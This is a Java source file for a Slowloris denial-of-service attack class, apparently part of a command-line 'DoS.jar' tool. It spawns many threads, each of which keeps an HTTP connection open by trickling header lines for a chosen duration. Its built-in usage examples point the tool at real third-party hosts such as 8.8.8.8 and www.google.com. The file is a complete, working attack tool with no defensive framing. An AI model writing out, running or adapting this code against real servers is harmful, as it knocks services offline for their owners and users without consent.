/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.willi.dos.methods;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.willi.dos.interfaces.Attack;
/**
 *
 * @author phamm
 */
public class SlowLoris implements Attack
{
    private String host;
    private int threads;
    private int duration;
    private static String[] help = {"DoS.jar --slowloris --target 8.8.8.8 --connections 400 --duration 6", "DoS.jar -sl -t www.google.com -c 500 -d 10"};
    private static Random rand = new Random();
    
    public SlowLoris(String host, int threads, int duration)
    {
        this.host = host;
        this.threads = threads;
        this.duration = duration; //Will be added as argmuent later
    }

    public static String printExampleUsage()
    {
        return help[rand.nextInt(2)];
    }

    @Override
    public void startAttack()
    {
        for(int i = 0; i < threads; i++)
        {
            new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    try
                  {
                        Socket socket = new Socket(host, 80);
                        PrintWriter out = new PrintWriter(socket.getOutputStream());
                        out.println("GET / HTTP/1.1");
                        out.println("Host: " + host);
                        out.println("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)");
                        out.println("Content-Length: 42");
                        long endtime = System.currentTimeMillis() + (duration * 1000);
                        while(System.currentTimeMillis() < endtime)
                        {
                            out.println("X-a: b");
                            Thread.sleep(200);
                        }
                        out.close();
                        socket.close();
                        
                    }
                    catch (IOException ex)
                    {
                        System.err.println("Cannot connect to " + host);
                        System.exit(0);
                    }
                    catch (InterruptedException ex)
                    {
                        
                    }
                }
            }).start();
}
    }
    
    
}
